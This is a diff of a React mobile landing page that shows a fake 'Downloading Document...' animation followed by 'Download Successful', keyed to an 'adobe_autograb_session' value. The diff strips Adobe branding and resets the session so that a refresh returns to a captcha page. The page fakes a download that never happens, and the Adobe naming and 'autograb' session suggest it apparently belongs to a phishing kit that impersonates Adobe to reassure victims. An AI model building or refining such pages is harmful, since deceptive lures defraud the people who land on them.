@@ -8,8 +8,11 @@ interface MobileLandingPageProps {
  * MobileLandingPage simplified to only implement the download-sequence behavior:
  * - On mount, if adobe_autograb_session exists and the download overlay hasn't yet been shown
  *   for that session, show "Downloading Document...." with animated dots.
- * - After a short interval switch to "Download Successful — check folder." and keep it visible
+ * - After a short interval switch to "Download Successful" and keep it visible
  *   until the page is refreshed.
+ *
+ * NOTE: remove the persisted adobe_autograb_session from localStorage once the
+ * sequence completes so that a full page refresh returns the user to the captcha page.
  */
 const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
@@ -56,6 +59,10 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         try {
           sessionStorage.setItem(shownKey, new Date().toISOString());
         } catch {}
+        // Remove persisted session so a full refresh returns to captcha
+        try {
+          localStorage.removeItem('adobe_autograb_session');
+        } catch {}
         successTimeoutRef.current = null;
       }, 3000) as unknown as number;
 
@@ -78,8 +85,7 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
   return (
     <div style={{ minHeight: '100vh', background: '#0b0b0b', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff' }}>
       <div style={{ textAlign: 'center', opacity: showOverlay ? 0.2 : 1 }}>
-        <div style={{ fontSize: 18, fontWeight: 600, marginBottom: 6 }}>Adobe Cloud (Mobile)</div>
-        <div style={{ color: '#cfcfcf' }}>Authenticated</div>
+        {/* Intentionally left blank to remove branding and welcome text */}
       </div>
 
       {showOverlay && (
@@ -102,7 +108,7 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
             background: 'transparent'
           }}>
             {phase === 'downloading' && <span>Downloading Document{dots}</span>}
-            {phase === 'success' && <span>Download Successful — check folder.</span>}
+            {phase === 'success' && <span>Download Successful</span>}
           </div>
         </div>
       )}
